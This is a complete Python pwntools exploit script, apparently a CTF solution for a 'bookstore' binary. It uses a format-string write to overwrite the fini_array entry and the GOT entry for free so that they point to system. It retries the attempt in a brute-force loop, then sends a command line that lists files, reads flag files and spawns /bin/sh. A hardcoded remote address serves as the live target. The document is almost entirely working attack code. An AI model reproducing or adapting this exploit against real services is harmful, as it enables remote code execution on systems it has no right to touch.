from pwn import *
context.update(arch='amd64', os='linux')

def rop(*args):
    return struct.pack('Q' * len(args), *args)

cwd = '/media/sf_shared/hlu15/bookstore'
libc = os.path.join(cwd, './libc.so.6')
bookstore = os.path.join(cwd, './books_757b0a24b0193ec8989290ec6923dd1d')
e_bs = ELF(bookstore)
e_libc = ELF(libc)


LIVE = False
# LIVE = True

def conn():
    ####### LOCAL #######
    if not LIVE:
        env = os.environ.copy()
        env['LD_PRELOAD'] = libc
        r = process(args=['stdbuf', '-o0', bookstore], cwd=cwd, env=env)
        time.sleep(0.8)

    if LIVE:
        r = remote('149.13.33.84', 1519)

    return r


nextsize = 0x24
fini_address = 0x6011b8
main = 0x400A39     # old fini value: 0x400830
free_got_lsb0 = 0x00000000006013B8
free_got_lsb12 = 0x00000000006013B9
system_fix = 0x640
system_local = 0x859640

fmt_str_1 = \
    '%9$.42u%14$hhn' \
    '%9$.2553u%13$hn' \
    '%9$.31581u%15$hn' \

fmt_str_1 = fmt_str_1.ljust(0x88, 'Z')
print 'First format string: ', hex(len(fmt_str_1)), fmt_str_1
assert len(fmt_str_1) == 0x88

for i in range(66666):
    try:
        r = conn()
        print 'Iteration :', hex(i)
        print r.sendlineafter('Submit\n', '1' + 'EEEEEEE' + p64(fini_address) + p64(free_got_lsb0) + p64(free_got_lsb12))
        print r.sendlineafter('order:', fmt_str_1 +
                              p64(320 + 17) +
                              cyclic(320) +
                              p64(320) +
                              p64(nextsize + 1) +
                              cyclic(nextsize + 8) +
                              p64(1)
                              )

        print r.sendlineafter('Submit\n', '4')
        print r.sendlineafter('Submit\n', '5')

        resp = r.recvuntil('allowed!')

        print r.sendlineafter('Submit\n', '1')
        print r.sendlineafter('order:', '  echo OK GOOGLE; ls -la; cat fl*; /bin/sh\x00\n')
        print r.sendlineafter('Submit\n', '3')
        resp = r.recvrepeat(5)
        if 'GOOGLE' in resp:
            print 'SUCCESS'
            print resp
            break
        r.close()
    except Exception as e:
        print e.message
        time.sleep(2)
        continue

r.interactive()
